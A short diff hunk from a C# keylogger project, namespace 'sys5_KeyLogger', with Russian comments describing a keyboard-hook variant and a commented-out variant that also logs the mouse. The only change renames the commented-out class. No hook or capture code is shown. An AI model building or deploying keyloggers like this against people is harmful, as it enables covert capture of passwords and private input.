@@ -27,7 +27,7 @@ namespace sys5_KeyLogger
 
 			// 2 варианта кейлоггера, 1 закомментировать
 			SetHook(); // hook версия
-			// myKeyLogger = new BetterKeyLogger(wtc); // другая версия, с логированием мыши
+			// myKeyLogger = new MyKeyLogger(wtc); // другая версия, с логированием мыши
 
 			if (myKeyLogger != null)
 				myKeyLogger.Start();
